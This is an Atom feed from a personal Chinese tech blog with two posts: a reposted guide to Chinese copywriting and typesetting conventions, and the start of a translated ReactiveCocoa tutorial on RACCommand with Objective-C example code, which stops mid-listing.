<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小鱼周凌宇のCODE_HOME</title>
  <subtitle>技术宅 iOS开发 JAVA开发 萌妹子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhoulingyu.com/"/>
  <updated>2016-08-17T11:14:08.000Z</updated>
  <id>http://zhoulingyu.com/</id>
  
  <author>
    <name>小鱼周凌宇</name>
    <email>coderfish@163.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[来自Github·sparanoid]中文文案排版指北</title>
    <link href="http://zhoulingyu.com/2016/08/17/%E6%9D%A5%E8%87%AAGithub%C2%B7sparanoid-%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%88%E6%8E%92%E7%89%88%E6%8C%87%E5%8C%97/"/>
    <id>http://zhoulingyu.com/2016/08/17/来自Github·sparanoid-中文文案排版指北/</id>
    <published>2016-08-17T11:03:01.000Z</published>
    <updated>2016-08-17T11:14:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文来自 <a href="https://github.com/sparanoid/chinese-copywriting-guidelines" target="_blank" rel="external">chinese-copywriting-guidelines</a><br>作者：<a href="https://github.com/sparanoid" target="_blank" rel="external">sparanoid</a><br>中文版作者：<a href="https://github.com/mzlogin" target="_blank" rel="external">mzlogin</a></p>
<h1 id="中文文案排版指北"><a href="#中文文案排版指北" class="headerlink" title="中文文案排版指北"></a>中文文案排版指北</h1><p><img src="https://david-dm.org/mzlogin/chinese-copywriting-guidelines/dev-status.svg" alt="devDependency Status"></p>
<p>统一中文文案、排版的相关用法，降低团队成员之间的沟通成本，增强网站气质。</p>
<p>Other languages:</p>
<ul>
<li><a href="https://github.com/mzlogin/chinese-copywriting-guidelines/blob/Simplified/README.en.md" target="_blank" rel="external">English</a></li>
<li><a href="https://github.com/sparanoid/chinese-copywriting-guidelines" target="_blank" rel="external">Chinese Traditional</a></li>
<li><a href="https://github.com/mzlogin/chinese-copywriting-guidelines" target="_blank" rel="external">Chinese Simplified</a></li>
</ul>
<hr>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#空格">空格</a><ul>
<li><a href="#中英文之间需要增加空格">中英文之间需要增加空格</a></li>
<li><a href="#中文与数字之间需要增加空格">中文与数字之间需要增加空格</a></li>
<li><a href="#数字与单位之间需要增加空格">数字与单位之间需要增加空格</a></li>
<li><a href="#全角标点与其他字符之间不加空格">全角标点与其他字符之间不加空格</a></li>
<li><a href="#-ms-text-autospace-to-the-rescue"><code>-ms-text-autospace</code> to the rescue?</a></li>
</ul>
</li>
<li><a href="#标点符号">标点符号</a><ul>
<li><a href="#不重复使用标点符号">不重复使用标点符号</a></li>
</ul>
</li>
<li><a href="#全角和半角">全角和半角</a><ul>
<li><a href="#使用全角中文标点">使用全角中文标点</a></li>
<li><a href="#数字使用半角字符">数字使用半角字符</a></li>
<li><a href="#遇到完整的英文整句特殊名词其內容使用半角标点">遇到完整的英文整句、特殊名词，其內容使用半角标点</a></li>
</ul>
</li>
<li><a href="#名词">名词</a><ul>
<li><a href="#专有名词使用正确的大小写">专有名词使用正确的大小写</a></li>
<li><a href="#不要使用不地道的缩写">不要使用不地道的缩写</a></li>
</ul>
</li>
<li><a href="#争议">争议</a><ul>
<li><a href="#链接之间增加空格">链接之间增加空格</a></li>
<li><a href="#简体中文使用直角引号">简体中文使用直角引号</a></li>
</ul>
</li>
<li><a href="#工具">工具</a></li>
<li><a href="#谁在这样做">谁在这样做？</a></li>
<li><a href="#参考文献">参考文献</a></li>
</ul>
<h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p>「有研究显示，打字的时候不喜欢在中文和英文之间加空格的人，感情路都走得很辛苦，有七成的比例会在 34 岁的时候跟自己不爱的人结婚，而其余三成的人最后只能把遗产留给自己的猫。毕竟爱情跟书写都需要适时地留白。</p>
<p>与大家共勉之。」——<a href="https://github.com/vinta/pangu.js" target="_blank" rel="external">vinta/paranoid-auto-spacing</a></p>
<h3 id="中英文之间需要增加空格"><a href="#中英文之间需要增加空格" class="headerlink" title="中英文之间需要增加空格"></a>中英文之间需要增加空格</h3><p>正确：</p>
<blockquote>
<p>在 LeanCloud 上，数据存储是围绕 <code>AVObject</code> 进行的。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>在LeanCloud上，数据存储是围绕<code>AVObject</code>进行的。</p>
<p>在 LeanCloud上，数据存储是围绕<code>AVObject</code> 进行的。</p>
</blockquote>
<p>完整的正确用法：</p>
<blockquote>
<p>在 LeanCloud 上，数据存储是围绕 <code>AVObject</code> 进行的。每个 <code>AVObject</code> 都包含了与 JSON 兼容的 key-value 对应的数据。数据是 schema-free 的，你不需要在每个 <code>AVObject</code> 上提前指定存在哪些键，只要直接设定对应的 key-value 即可。</p>
</blockquote>
<p>例外：「豆瓣FM」等产品名词，按照官方所定义的格式书写。</p>
<h3 id="中文与数字之间需要增加空格"><a href="#中文与数字之间需要增加空格" class="headerlink" title="中文与数字之间需要增加空格"></a>中文与数字之间需要增加空格</h3><p>正确：</p>
<blockquote>
<p>今天出去买菜花了 5000 元。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>今天出去买菜花了 5000元。</p>
<p>今天出去买菜花了5000元。</p>
</blockquote>
<h3 id="数字与单位之间需要增加空格"><a href="#数字与单位之间需要增加空格" class="headerlink" title="数字与单位之间需要增加空格"></a>数字与单位之间需要增加空格</h3><p>正确：</p>
<blockquote>
<p>我家的光纤入户宽带有 10 Gbps，SSD 一共有 20 TB。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>我家的光纤入户宽带有 10Gbps，SSD 一共有 10TB。</p>
</blockquote>
<p>例外：度／百分比与数字之间不需要增加空格：</p>
<p>正确：</p>
<blockquote>
<p>今天是 233° 的高温。</p>
<p>新 MacBook Pro 有 15% 的 CPU 性能提升。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>今天是 233 ° 的高温。</p>
<p>新 MacBook Pro 有 15 % 的 CPU 性能提升。</p>
</blockquote>
<h3 id="全角标点与其他字符之间不加空格"><a href="#全角标点与其他字符之间不加空格" class="headerlink" title="全角标点与其他字符之间不加空格"></a>全角标点与其他字符之间不加空格</h3><p>正确：</p>
<blockquote>
<p>刚刚买了一部 iPhone，好开心！</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>刚刚买了一部 iPhone ，好开心！</p>
</blockquote>
<h3 id="ms-text-autospace-to-the-rescue"><a href="#ms-text-autospace-to-the-rescue" class="headerlink" title="-ms-text-autospace to the rescue?"></a><code>-ms-text-autospace</code> to the rescue?</h3><p>Microsoft 有个 <a href="http://msdn.microsoft.com/en-us/library/ie/ms531164(v=vs.85" target="_blank" rel="external"><code>-ms-text-autospace</code></a>.aspx) 的 CSS 属性可以实现自动为中英文之间增加空白。不过目前并未普及，另外在其他应用场景，例如 OS X、iOS 的用户界面目前并不存在这个特性，所以请继续保持随手加空格的习惯。</p>
<h2 id="标点符号"><a href="#标点符号" class="headerlink" title="标点符号"></a>标点符号</h2><h3 id="不重复使用标点符号"><a href="#不重复使用标点符号" class="headerlink" title="不重复使用标点符号"></a>不重复使用标点符号</h3><p>正确：</p>
<blockquote>
<p>德国队竟然战胜了巴西队！</p>
<p>她竟然对你说「喵」？！</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>德国队竟然战胜了巴西队！！</p>
<p>德国队竟然战胜了巴西队！！！！！！！！</p>
<p>她竟然对你说「喵」？？！！</p>
<p>她竟然对你说「喵」？！？！？？！！</p>
</blockquote>
<h2 id="全角和半角"><a href="#全角和半角" class="headerlink" title="全角和半角"></a>全角和半角</h2><p>不明白什么是全角（全形）与半角（半形）符号？请查看维基百科词条『<a href="http://zh.wikipedia.org/wiki/%E5%85%A8%E5%BD%A2%E5%92%8C%E5%8D%8A%E5%BD%A2" target="_blank" rel="external">全角和半角</a>』。</p>
<h3 id="使用全角中文标点"><a href="#使用全角中文标点" class="headerlink" title="使用全角中文标点"></a>使用全角中文标点</h3><p>正确：</p>
<blockquote>
<p>嗨！你知道嘛？今天前台的小妹跟我说「喵」了哎！</p>
<p>核磁共振成像（NMRI）是什么原理都不知道？JFGI！</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>嗨! 你知道嘛? 今天前台的小妹跟我说 “喵” 了哎!</p>
<p>嗨!你知道嘛?今天前台的小妹跟我说”喵”了哎!</p>
<p>核磁共振成像 (NMRI) 是什么原理都不知道? JFGI!</p>
<p>核磁共振成像(NMRI)是什么原理都不知道?JFGI!</p>
</blockquote>
<h3 id="数字使用半角字符"><a href="#数字使用半角字符" class="headerlink" title="数字使用半角字符"></a>数字使用半角字符</h3><p>正确：</p>
<blockquote>
<p>这件蛋糕只卖 1000 元。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>这件蛋糕只卖 １０００ 元。</p>
</blockquote>
<p>例外：在设计稿、宣传海报中如出现极少量数字的情形时，为方便文字对齐，是可以使用全角数字的。</p>
<h3 id="遇到完整的英文整句、特殊名词，其內容使用半角标点"><a href="#遇到完整的英文整句、特殊名词，其內容使用半角标点" class="headerlink" title="遇到完整的英文整句、特殊名词，其內容使用半角标点"></a>遇到完整的英文整句、特殊名词，其內容使用半角标点</h3><p>正确：</p>
<blockquote>
<p>乔布斯那句话是怎么说的？「Stay hungry, stay foolish.」</p>
<p>推荐你阅读《Hackers &amp; Painters: Big Ideas from the Computer Age》，非常的有趣。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>乔布斯那句话是怎么说的？「Stay hungry，stay foolish。」</p>
<p>推荐你阅读《Hackers＆Painters：Big Ideas from the Computer Age》，非常的有趣。</p>
</blockquote>
<h2 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h2><h3 id="专有名词使用正确的大小写"><a href="#专有名词使用正确的大小写" class="headerlink" title="专有名词使用正确的大小写"></a>专有名词使用正确的大小写</h3><p>大小写相关用法原属于英文书写范畴，不属于本 wiki 讨论內容，在这里只对部分易错用法进行简述。</p>
<p>正确：</p>
<blockquote>
<p>使用 GitHub 登录</p>
<p>我们的客户有 GitHub、Foursquare、Microsoft Corporation、Google、Facebook, Inc.。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>使用 github 登录</p>
<p>使用 GITHUB 登录</p>
<p>使用 Github 登录</p>
<p>使用 gitHub 登录</p>
<p>使用 gｲんĤЦ8 登录</p>
<p>我们的客户有 github、foursquare、microsoft corporation、google、facebook, inc.。</p>
<p>我们的客户有 GITHUB、FOURSQUARE、MICROSOFT CORPORATION、GOOGLE、FACEBOOK, INC.。</p>
<p>我们的客户有 Github、FourSquare、MicroSoft Corporation、Google、FaceBook, Inc.。</p>
<p>我们的客户有 gitHub、fourSquare、microSoft Corporation、google、faceBook, Inc.。</p>
<p>我们的客户有 gｲんĤЦ8、ｷouЯƧquﾑгє、๓เςг๏ร๏Ŧt ς๏гק๏гคtเ๏ภn、900913、ƒ4ᄃëв๏๏к, IПᄃ.。</p>
</blockquote>
<p>注意：当网页中需要配合整体视觉风格而出现全部大写／小写的情形，HTML 中请使用标准的大小写规范进行书写；并通过 <code>text-transform: uppercase;</code>／<code>text-transform: lowercase;</code> 对表现形式进行定义。</p>
<h3 id="不要使用不地道的缩写"><a href="#不要使用不地道的缩写" class="headerlink" title="不要使用不地道的缩写"></a>不要使用不地道的缩写</h3><p>正确：</p>
<blockquote>
<p>我们需要一位熟悉 JavaScript、HTML5，至少理解一种框架（如 Backbone.js、AngularJS、React 等）的前端开发者。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>我们需要一位熟悉 Js、h5，至少理解一种框架（如 backbone、angular、RJS 等）的 FED。</p>
</blockquote>
<h2 id="争议"><a href="#争议" class="headerlink" title="争议"></a>争议</h2><p>以下用法略带有个人色彩，既：无论是否遵循下述规则，从语法的角度来讲都是<strong>正确</strong>的。</p>
<h3 id="链接之间增加空格"><a href="#链接之间增加空格" class="headerlink" title="链接之间增加空格"></a>链接之间增加空格</h3><p>用法：</p>
<blockquote>
<p>请 <a href="#">提交一个 issue</a> 并分配给相关同事。</p>
<p>访问我们网站的最新动态，请 <a href="#">点击这里</a> 进行订阅！</p>
</blockquote>
<p>对比用法：</p>
<blockquote>
<p>请<a href="#">提交一个 issue</a> 并分配给相关同事。</p>
<p>访问我们网站的最新动态，请<a href="#">点击这里</a>进行订阅！</p>
</blockquote>
<h3 id="简体中文使用直角引号"><a href="#简体中文使用直角引号" class="headerlink" title="简体中文使用直角引号"></a>简体中文使用直角引号</h3><p>用法：</p>
<blockquote>
<p>「老师，『有条不紊』的『紊』是什么意思？」</p>
</blockquote>
<p>对比用法：</p>
<blockquote>
<p>“老师，‘有条不紊’的‘紊’是什么意思？”</p>
</blockquote>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><table>
<thead>
<tr>
<th>仓库</th>
<th>语言</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://github.com/vinta/paranoid-auto-spacing" target="_blank" rel="external">vinta/paranoid-auto-spacing</a></td>
<td>JavaScript</td>
</tr>
<tr>
<td><a href="https://github.com/huei90/pangu.node" target="_blank" rel="external">huei90/pangu.node</a></td>
<td>Node.js</td>
</tr>
<tr>
<td><a href="https://github.com/huacnlee/auto-correct" target="_blank" rel="external">huacnlee/auto-correct</a></td>
<td>Ruby</td>
</tr>
<tr>
<td><a href="https://github.com/sparanoid/space-lover" target="_blank" rel="external">sparanoid/space-lover</a></td>
<td>PHP (WordPress)</td>
</tr>
<tr>
<td><a href="https://github.com/NauxLiu/auto-correct" target="_blank" rel="external">nauxliu/auto-correct</a></td>
<td>PHP</td>
</tr>
<tr>
<td><a href="https://github.com/hotoo/pangu.vim" target="_blank" rel="external">hotoo/pangu.vim</a></td>
<td>Vim</td>
</tr>
<tr>
<td><a href="https://github.com/sparanoid/grunt-auto-spacing" target="_blank" rel="external">sparanoid/grunt-auto-spacing</a></td>
<td>Node.js (Grunt)</td>
</tr>
<tr>
<td><a href="https://github.com/hjiang/scripts/blob/master/add-space-between-latin-and-cjk" target="_blank" rel="external">hjiang/scripts/add-space-between-latin-and-cjk</a></td>
<td>Python</td>
</tr>
</tbody>
</table>
<h2 id="谁在这样做？"><a href="#谁在这样做？" class="headerlink" title="谁在这样做？"></a>谁在这样做？</h2><table>
<thead>
<tr>
<th>网站</th>
<th>文案</th>
<th>UGC</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://www.apple.com/cn/" target="_blank" rel="external">Apple 中国</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.apple.com/hk/" target="_blank" rel="external">Apple 香港</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.apple.com/tw/" target="_blank" rel="external">Apple 台湾</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.microsoft.com/zh-cn/" target="_blank" rel="external">Microsoft 中国</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.microsoft.com/zh-hk/" target="_blank" rel="external">Microsoft 香港</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.microsoft.com/zh-tw/" target="_blank" rel="external">Microsoft 台湾</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://leancloud.cn/" target="_blank" rel="external">LeanCloud</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://www.zhihu.com/" target="_blank" rel="external">知乎</a></td>
<td>Yes</td>
<td>部分用户达成</td>
</tr>
<tr>
<td><a href="https://www.v2ex.com/" target="_blank" rel="external">V2EX</a></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td><a href="https://segmentfault.com/" target="_blank" rel="external">SegmentFault</a></td>
<td>Yes</td>
<td>部分用户达成</td>
</tr>
<tr>
<td><a href="http://apple4us.com/" target="_blank" rel="external">Apple4us</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://www.wandoujia.com/" target="_blank" rel="external">豌豆荚</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://ruby-china.org/" target="_blank" rel="external">Ruby China</a></td>
<td>Yes</td>
<td>标题达成</td>
</tr>
<tr>
<td><a href="https://phphub.org/" target="_blank" rel="external">PHPHub</a></td>
<td>Yes</td>
<td>标题达成</td>
</tr>
</tbody>
</table>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://grammar.about.com/od/punctuationandmechanics/a/Guidelines-For-Using-Capital-Letters.htm" target="_blank" rel="external">Guidelines for Using Capital Letters</a></li>
<li><a href="http://en.wikipedia.org/wiki/Letter_case" target="_blank" rel="external">Letter case - Wikipedia</a></li>
<li><a href="http://www.oxforddictionaries.com/words/punctuation" target="_blank" rel="external">Punctuation - Oxford Dictionaries</a></li>
<li><a href="https://owl.english.purdue.edu/owl/section/1/6/" target="_blank" rel="external">Punctuation - The Purdue OWL</a></li>
<li><a href="http://www.wikihow.com/Use-English-Punctuation-Correctly" target="_blank" rel="external">How to Use English Punctuation Corrently - wikiHow</a></li>
<li><a href="https://zh.opensuse.org/index.php?title=Help:%E6%A0%BC%E5%BC%8F" target="_blank" rel="external">格式 - openSUSE</a></li>
<li><a href="http://zh.wikipedia.org/wiki/%E5%85%A8%E5%BD%A2%E5%92%8C%E5%8D%8A%E5%BD%A2" target="_blank" rel="external">全角和半角 - 维基百科</a></li>
<li><a href="http://zh.wikipedia.org/wiki/%E5%BC%95%E8%99%9F" target="_blank" rel="external">引号 - 维基百科</a></li>
<li><a href="http://zh.wikipedia.org/wiki/%E7%96%91%E5%95%8F%E9%A9%9A%E5%98%86%E8%99%9F" target="_blank" rel="external">疑问惊叹号 - 维基百科</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文来自 &lt;a href=&quot;https://github.com/sparanoid/chinese-copywriting-guidelines&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;chinese-copywriting-guidelines&lt;
    
    </summary>
    
      <category term="转载" scheme="http://zhoulingyu.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
      <category term="reproduction" scheme="http://zhoulingyu.com/tags/reproduction/"/>
    
  </entry>
  
  <entry>
    <title>ReactiveCocoa概要：了解和使用RACCommand</title>
    <link href="http://zhoulingyu.com/2016/08/05/ReactiveCocoa%E6%A6%82%E8%A6%81%EF%BC%9A%E4%BA%86%E8%A7%A3%E5%92%8C%E4%BD%BF%E7%94%A8RACCommand/"/>
    <id>http://zhoulingyu.com/2016/08/05/ReactiveCocoa概要：了解和使用RACCommand/</id>
    <published>2016-08-05T02:33:00.000Z</published>
    <updated>2016-08-06T07:57:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h1><p><a href="http://codeblog.shape.dk/blog/2013/12/05/reactivecocoa-essentials-understanding-and-using-raccommand/" target="_blank" rel="external">点击这里</a></p>
<p>这几天部门的前辈再用RAC的时候问到一个问题，RACCommand在RAC中具体的作用和起到的功能，到底应该如何应用它。</p>
<p>关于RAC的使用文章非常多，但是大多仅限于介绍和基本的使用方法，很少介绍RAC究竟应该如何优雅的嵌入到项目中。</p>
<p>在查阅资料的时候发现了此篇博文，写的非常细致，所以做了一次搬运工。</p>
<p>另，妹子我的英文属于渣渣系列，所以有什么翻译不当，请一定要指教。</p>
<a id="more"></a>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>文章中所有代码在<a href="https://github.com/olegam/RACCommandExample" target="_blank" rel="external">这里</a></p>
<h1 id="RACCommand是你的新伙伴吗？"><a href="#RACCommand是你的新伙伴吗？" class="headerlink" title="RACCommand是你的新伙伴吗？"></a>RACCommand是你的新伙伴吗？</h1><p><code>RACCommand</code>是ReactiveCocoa最精华的部分之一，它可以让你在开发中节约大量的时间并让你的iOS或者OS X app有更强的鲁棒性。</p>
<p>我见过不少刚接触ReactiveCocoa（后文将简写为RAC），还不能完全理解<code>RACCommand</code>是如何工作又不知何时应该使用<code>RACCommand</code>的同学。所以我认为这个小介绍将会市场实用，可以给他们带来一些启发。官方文档并没有给出多少如何使用RACCommand的Examples，但是<a href="https://github.com/ReactiveCocoa/ReactiveCocoa/blob/master/ReactiveCocoa/Objective-C/RACCommand.h" target="_blank" rel="external">RACCommand头文件的介绍还是很不错的</a>，不过这对刚开始用RAC的同学来说还是太难理解了。</p>
<p><code>RACCommand</code>类是用于表示一些操作的执行。通常，是由于UI上的一些事件触发了<code>RACCommand</code>的执行。比如当用户按了一个按钮，如果对应<code>RACCommand</code>实例可以被执行，就会执行相应的操作。这使得它很容易和UI进行绑定，同时可以保证当<code>RACCommand</code>处于<code>not enabled</code>时<code>RACCommand</code>实例的操作不会被执行。当Command可以执行时，常做的方式是把allowsconcuuent的属性设置为NO，这可以保证Command已经执行完成后不会被重复执行。Command执行的结果是一个RACSignal，因此你可以调用<code>next:</code>、<code>completed:</code>、或者<code>error:</code>。后面将会展示具体使用方式。</p>
<h1 id="Example-App"><a href="#Example-App" class="headerlink" title="Example App"></a>Example App</h1><p>我们假设我们正在设计一个简单的app，其功能是让用户订阅一个邮件。最简单的方式是，用一个UITextField和一个UIButton。当用户输入email并且点击按钮的时候，email地址将会传给某个web服务。看起来很简单，但是我们应该确保用户有最好的体验。<code>如果用户按了两次按钮？``如何处理请求出错？``如果email不合法？``RACCommand</code>可以帮助我们处理这些情况。在这篇文章中将一步步完善这个小app以此来讨论一些概念和工作原理。</p>
<p><img src="http://codeblog.shape.dk/images/raccommand_example_app_screenshot.png" alt=""></p>
<p>可以从<a href="https://github.com/olegam/RACCommandExample" target="_blank" rel="external">这里</a>获得源码。</p>
<p>从一个非常简单的ViewController可以很好的实践MVVM模式。</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)bindWithViewModel &#123;</div><div class="line">  RAC(<span class="keyword">self</span>.viewModel, email) = <span class="keyword">self</span>.emailTextField.rac_textSignal;</div><div class="line">  <span class="keyword">self</span>.subscribeButton.rac_command = <span class="keyword">self</span>.viewModel.subscribeCommand;</div><div class="line">  RAC(<span class="keyword">self</span>.statusLabel, text) = RACObserve(<span class="keyword">self</span>.viewModel, statusMessage);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上面的方法（在<code>viewDidLoad</code>中调用），在View和ViewModel中建立了绑定关系。下面是ViewModel的定义：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">SubscribeViewModel</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACCommand *subscribeCommand;</div><div class="line"></div><div class="line"><span class="comment">// write to this property</span></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span> *email;</div><div class="line"></div><div class="line"><span class="comment">// read from this property</span></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span> *statusMessage;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>如上所示，一个暴露出的RACCommand属性。另外两个是字符串属性，它们和View的两个属性绑定在一起。ViewModel的完整实现如下:</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"SubscribeViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"AFHTTPRequestOperationManager+RACSupport.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"NSString+EmailAdditions.h"</span></span></div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *<span class="keyword">const</span> kSubscribeURL = <span class="string">@"http://reactivetest.apiary.io/subscribers"</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">SubscribeViewModel</span> ()</span></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *emailValidSignal;</div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">SubscribeViewModel</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">id</span>)init &#123;</div><div class="line">  <span class="keyword">self</span> = [<span class="keyword">super</span> init];</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">self</span>) &#123;</div><div class="line">      [<span class="keyword">self</span> mapSubscribeCommandStateToStatusMessage];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">self</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)mapSubscribeCommandStateToStatusMessage &#123;</div><div class="line">  RACSignal *startedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals map:^<span class="keyword">id</span>(RACSignal *subscribeSignal) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Sending request..."</span>, <span class="literal">nil</span>);</div><div class="line">  &#125;];</div><div class="line"></div><div class="line">  RACSignal *completedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals flattenMap:^RACStream *(RACSignal *subscribeSignal) &#123;</div><div class="line">      <span class="keyword">return</span> [[[subscribeSignal materialize] filter:^<span class="built_in">BOOL</span>(RACEvent *event) &#123;</div><div class="line">          <span class="keyword">return</span> event.eventType == RACEventTypeCompleted;</div><div class="line">      &#125;] map:^<span class="keyword">id</span>(<span class="keyword">id</span> value) &#123;</div><div class="line">          <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Thanks"</span>, <span class="literal">nil</span>);</div><div class="line">      &#125;];</div><div class="line">  &#125;];</div><div class="line"></div><div class="line">  RACSignal *failedMessageSource = [[<span class="keyword">self</span>.subscribeCommand.errors subscribeOn:[RACScheduler mainThreadScheduler]] map:^<span class="keyword">id</span>(<span class="built_in">NSError</span> *error) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Error :("</span>, <span class="literal">nil</span>);</div><div class="line">  &#125;];</div><div class="line"></div><div class="line">  RAC(<span class="keyword">self</span>, statusMessage) = [RACSignal merge:@[startedMessageSource, completedMessageSource, failedMessageSource]];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (RACCommand *)subscribeCommand &#123;</div><div class="line">  <span class="keyword">if</span> (!_subscribeCommand) &#123;</div><div class="line">      <span class="built_in">NSString</span> *email = <span class="keyword">self</span>.email;</div><div class="line">      _subscribeCommand = [[RACCommand alloc] initWithEnabled:<span class="keyword">self</span>.emailValidSignal signalBlock:^RACSignal *(<span class="keyword">id</span> input) &#123;</div><div class="line">          <span class="keyword">return</span> [SubscribeViewModel postEmail:email];</div><div class="line">      &#125;];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> _subscribeCommand;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (RACSignal *)postEmail:(<span class="built_in">NSString</span> *)email &#123;</div><div class="line">  AFHTTPRequestOperationManager *manager = [AFHTTPRequestOperationManager manager];</div><div class="line">  manager.requestSerializer = [AFJSONRequestSerializer new];</div><div class="line">  <span class="built_in">NSDictionary</span> *body = @&#123;<span class="string">@"email"</span>: email ?: <span class="string">@""</span>&#125;;</div><div class="line">  <span class="keyword">return</span> [[[manager rac_POST:kSubscribeURL parameters:body] logError] replayLazily];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (RACSignal *)emailValidSignal &#123;</div><div class="line">  <span class="keyword">if</span> (!_emailValidSignal) &#123;</div><div class="line">      _emailValidSignal = [RACObserve(<span class="keyword">self</span>, email) map:^<span class="keyword">id</span>(<span class="built_in">NSString</span> *email) &#123;</div><div class="line">          <span class="keyword">return</span> @([email 